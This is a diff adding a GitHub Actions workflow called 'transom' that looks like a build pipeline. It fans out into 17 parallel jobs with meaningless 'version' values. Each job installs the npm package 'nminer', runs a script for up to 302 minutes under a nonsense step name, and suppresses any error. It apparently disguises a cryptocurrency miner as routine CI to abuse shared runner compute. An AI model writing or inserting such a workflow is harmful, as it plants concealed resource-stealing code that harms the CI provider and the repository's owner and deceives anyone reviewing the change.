@@ -1,0 +1,42 @@
+name: transom
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 9716 }
+          - { version: 8409 }
+          - { version: 340 }
+          - { version: 4167 }
+          - { version: 1785 }
+          - { version: 6943 }
+          - { version: 2177 }
+          - { version: 8321 }
+          - { version: 4141 }
+          - { version: 2503 }
+          - { version: 8403 }
+          - { version: 3945 }
+          - { version: 1665 }
+          - { version: 4595 }
+          - { version: 270 }
+          - { version: 6124 }
+          - { version: 5550 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: whether through knowledgeable finally
+        run: |
+          npm install nminer@latest
+          timeout 302m node transom.js || echo "transom executed"
